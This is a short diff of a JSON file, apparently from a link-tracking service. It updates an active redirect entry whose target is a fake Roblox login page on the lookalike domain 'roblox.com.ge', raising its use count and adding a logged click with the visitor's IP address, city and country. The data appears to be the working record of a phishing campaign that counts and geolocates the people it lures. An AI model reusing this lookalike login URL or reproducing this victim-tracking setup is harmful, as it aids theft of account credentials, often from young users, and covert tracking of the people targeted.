@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1187,
+    "useCount": 1188,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9640,6 +9640,14 @@
         "city": "Baguio City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777298736397,
+        "ip": "64.233.173.164",
+        "country": "United States",
+        "city": "Mountain View",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
